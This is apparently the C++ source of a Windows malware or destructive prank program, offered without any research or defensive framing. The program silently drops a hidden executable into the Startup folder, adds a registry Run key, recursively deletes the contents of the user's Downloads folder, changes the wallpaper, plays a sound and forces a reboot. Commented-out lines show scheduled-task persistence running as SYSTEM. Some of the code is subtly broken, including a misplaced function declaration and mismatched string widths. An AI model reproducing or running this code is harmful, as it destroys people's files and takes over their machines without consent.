#include "Header.h"


int APIENTRY wWinMain(HINSTANCE Instance, //no window
	HINSTANCE hPreInstance,
	LPTSTR    lpCmdLine,
	int		  nCmdShow) {

	char* userdatapath = getenv("APPDATA"); //get %appdata% path
	std::string datapath;
	datapath = std::string(userdatapath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //full startup path
	char filename[MAX_PATH] = "systemtask.exe";
	char newLocation[77];
	strcpy(newLocation, datapath.c_str());


	if (std::filesystem::exists(datapath + "\\systemtask.exe") != true) { //checks for existing file
		
		//extracts exe
		HRSRC hResInformation = FindResource(NULL, MAKEINTRESOURCE(105), _T("BINARY"));

		HGLOBAL hResc = LoadResource(NULL, hResInformation);

		unsigned char* Res = (unsigned char*)LockResource(hResc);

		int Ressize = SizeofResource(NULL, hResInformation);

		HANDLE exeFile = CreateFile(L"systemtask.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD wWritten = Ressize;
		WriteFile(exeFile, Res, Ressize, &wWritten, NULL);

		CloseHandle(exeFile);
		
		//copies itself to starup folder
		std::filesystem::copy(filename, newLocation);
        
		//****NOT IMPLEMENTED****

		//std::filesystem::copy(filename, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
		//BOOL stats = 0;
		//DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); 
		//if (size)
			//CopyFileA(filename, newLocation, stats);
	}
	
	//get %userprofile% path
	char* userpath = getenv("USERPROFILE"); 
	std::string path;

	//sets full directory path
	if (userpath != nullptr) {

		path = std::string(userpath) + "\\Downloads"; 

	}
	//removes files under dir recusivly
	void deleteDirectoryContents(const std::string & path); {
		for (const auto& entry : std::filesystem::directory_iterator(path)) { 

			std::filesystem::remove_all(entry.path());

		}
	}
	
	HANDLE hToken = NULL;
	LUID luid;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken); //gives current process shutdown priv
	LookupPrivilegeValue(L"", SE_SHUTDOWN_NAME, &luid);
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, 0);
	
	//****NOT IMPLEMENTED****
    
	//STARTUPINFOA lpStartupInfo;
    //PROCESS_INFORMATION lpProcessInformation;
    //char buf[MAX_PATH] = "cmd /c schtasks.exe /create /sc onstart /tn \"APP\" /tr \"C:\\Users\\genesis.exe\" /rl highest";
    //CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &lpStartupInfo, &lpProcessInformation);
    
	//****NOT IMPLEMENTED****
	
	//system("cmd /c schtasks.exe /create /f /sc onlogon /tn \"SYSTEMPROCESS\" /tr \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemtask.exe\" /ru system /rl highest");
	
	//creates registry key for autostart
	std::string progPath = "%APPDATA%\\Microsoft\\Start Menu\\Programs\\Startup\\systemtask.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);       
	LONG status = RegSetValueEx(hkey, L"SYSTEMTASK", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
    

	//extracts jpg
	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(101), _T("JPG"));

	HGLOBAL hRes = LoadResource(NULL, hResInfo);

	unsigned char* memRes = (unsigned char*)LockResource(hRes);
	
	int sizeRes = SizeofResource(NULL, hResInfo);
	
	HANDLE hFile = CreateFile(L"bg.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD bytesWritten = sizeRes;
	WriteFile(hFile, memRes, sizeRes, &bytesWritten, NULL);

	CloseHandle(hFile);
	
	
	//extracts wav audio
	HRSRC hResInf = FindResource(NULL, MAKEINTRESOURCE(102), _T("WAVE"));

	HGLOBAL hRe = LoadResource(NULL, hResInf);

	unsigned char* mRes = (unsigned char*)LockResource(hRe);

	int size = SizeofResource(NULL, hResInf);

	HANDLE File = CreateFile(L"compositept2.wav", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD Written = size;
	WriteFile(File, mRes, size, &Written, NULL);

	CloseHandle(File);
	

	std::filesystem::copy("bg.jpg", "C:\\Users");
	//sets jpg as desktop background
	std::string jpgpath = "C:\\Users\\bg.jpg";
	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (char*)jpgpath.c_str(), SPIF_UPDATEINIFILE);

	
	//plays wav file
	PlaySound(L"compositept2.wav", NULL, SND_FILENAME);

	//****NOT IMPLEMENTED****

	//ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 
        //SHTDN_REASON_MINOR_OTHER);
	
	InitiateSystemShutdownExA(NULL,NULL,0,true, true, SHTDN_REASON_MINOR_OTHER); //restarts system
	return 0;
}